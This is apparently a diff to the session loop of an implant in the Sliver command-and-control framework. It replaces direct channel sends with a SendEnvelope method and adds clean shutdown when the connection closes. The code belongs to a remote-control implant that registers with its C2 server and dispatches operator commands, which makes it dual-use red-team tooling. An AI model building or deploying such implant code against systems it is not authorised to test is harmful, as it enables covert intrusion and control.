@@ -643,7 +643,7 @@ func sessionMainLoop(connection *transports.Connection) error {
 		// {{end}}
 		return err
 	}
-	pivots.RestartAllListeners(connection.Send)
+	pivots.RestartAllListeners(connection.SendEnvelope)
 	defer pivots.StopAllListeners()
 	defer connection.Stop()
 
@@ -653,7 +653,9 @@ func sessionMainLoop(connection *transports.Connection) error {
 	register := registerSliver()
 	register.ActiveC2 = connection.URL()
 	register.ProxyURL = connection.ProxyURL()
-	connection.Send <- wrapEnvelope(sliverpb.MsgRegister, register) // Send registration information
+	if !connection.SendEnvelope(wrapEnvelope(sliverpb.MsgRegister, register)) {
+		return nil
+	}
 
 	pivotHandlers := handlers.GetPivotHandlers()
 	tunHandlers := handlers.GetTunnelHandlers()
@@ -661,8 +663,20 @@ func sessionMainLoop(connection *transports.Connection) error {
 	specialHandlers := handlers.GetKillHandlers()
 	rportfwdHandlers := handlers.GetRportFwdHandlers()
 
-	for envelope := range connection.Recv {
-		envelope := envelope
+	for {
+		var envelope *sliverpb.Envelope
+		select {
+		case received, ok := <-connection.Recv:
+			if !ok {
+				return nil
+			}
+			envelope = received
+		case <-connection.Done():
+			return nil
+		}
+		if envelope == nil {
+			continue
+		}
 		if _, ok := specialHandlers[envelope.Type]; ok {
 			// {{if .Config.Debug}}
 			log.Printf("[recv] specialHandler %d", envelope.Type)
@@ -689,6 +703,7 @@ func sessionMainLoop(connection *transports.Connection) error {
 			log.Printf("[recv] sysHandler %d", envelope.Type)
 			// {{end}}
 
+			responseID := envelope.ID
 			// {{if eq .Config.GOOS "windows" }}
 			go handlers.WrapperHandler(handler, envelope.Data, func(data []byte, err error) {
 				// {{if .Config.Debug}}
@@ -696,10 +711,10 @@ func sessionMainLoop(connection *transports.Connection) error {
 					log.Printf("[session] handler function returned an error: %s", err)
 				}
 				// {{end}}
-				connection.Send <- &sliverpb.Envelope{
-					ID:   envelope.ID,
+				connection.SendEnvelope(&sliverpb.Envelope{
+					ID:   responseID,
 					Data: data,
-				}
+				})
 			})
 			// {{else}}
 			go handler(envelope.Data, func(data []byte, err error) {
@@ -708,10 +723,10 @@ func sessionMainLoop(connection *transports.Connection) error {
 					log.Printf("[session] handler function returned an error: %s", err)
 				}
 				// {{end}}
-				connection.Send <- &sliverpb.Envelope{
-					ID:   envelope.ID,
+				connection.SendEnvelope(&sliverpb.Envelope{
+					ID:   responseID,
 					Data: data,
-				}
+				})
 			})
 			// {{end}}
 		} else if handler, ok := tunHandlers[envelope.Type]; ok {
@@ -725,10 +740,12 @@ func sessionMainLoop(connection *transports.Connection) error {
 			// {{if .Config.Debug}}
 			log.Printf("[recv] unknown envelope type %d", envelope.Type)
 			// {{end}}
-			connection.Send <- &sliverpb.Envelope{
+			if !connection.SendEnvelope(&sliverpb.Envelope{
 				ID:                 envelope.ID,
 				Data:               nil,
 				UnknownMessageType: true,
+			}) {
+				return nil
 			}
 		}
 	}
